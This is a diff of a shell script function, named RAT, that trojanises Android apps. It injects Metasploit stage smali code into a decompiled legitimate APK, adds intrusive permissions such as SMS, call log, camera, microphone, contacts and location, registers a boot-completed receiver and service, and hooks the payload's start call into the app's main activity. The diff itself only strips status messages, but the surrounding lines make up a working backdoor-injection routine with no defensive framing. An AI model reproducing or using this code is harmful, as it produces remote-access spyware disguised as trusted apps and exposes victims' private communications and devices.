@@ -27,30 +27,22 @@ V6=$(pwgen -s 10 1)
 V7=$(pwgen -s 10 1) 
 V8=$(pwgen -s 10 1) 
 
-function RAT() {  
+function rat() {  
 # Configuration variables
 path_name=`head -n 2 output/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
 path_dash=`head -n 2 output/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'`
 perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
 
 # Permissions
-echo -e "I: Adding new permissions..."
-sleep 1.5
 sed -i "5i\ $perms" output/original/AndroidManifest.xml
 
 # Stirring MainActivity.smali
-echo -e "I: Removing MainActivity.smali..."
-sleep 1.5
 rm output/payload/smali/com/metasploit/stage/MainActivity.smali
 
 # Reconfiguring smali files
-echo -e "I: Setting smali files..."
-sleep 1.5
 sed -i "s|Lcom/metasploit|L$path_name|g" output/payload/smali/com/metasploit/stage/*.smali
 
 # Copying stage folder to original APK folder
-echo -e "I: Moving stage folder to original APK..."
-sleep 1.5
 cp -r output/payload/smali/com/metasploit/stage output/original/smali/$path_name
 
 # Concatenation variables 
@@ -58,8 +50,6 @@ amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$path_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$path_dash.stage.MainService'"/></application>'
 
 # Concatenating variables
-echo -e "I: Setting up AndroidManifest.xml..."
-sleep 1.5
 sed -i "s|$amanifest|$boot_cmp|g" output/original/AndroidManifest.xml    
 
 # Configuration variables
@@ -69,8 +59,6 @@ hook_num=`grep -n "    return-void" output/original/smali/$android_activity.smal
 
 # Invoking MainService 
 starter="   invoke-static {}, L$path_name/stage/MainService;->start()V"
-echo -e "I: Invoking MainService..."
-sleep 1.5
 sed -i "${hook_num}i\ ${starter}" output/original/smali/$android_activity.smali
 }
 
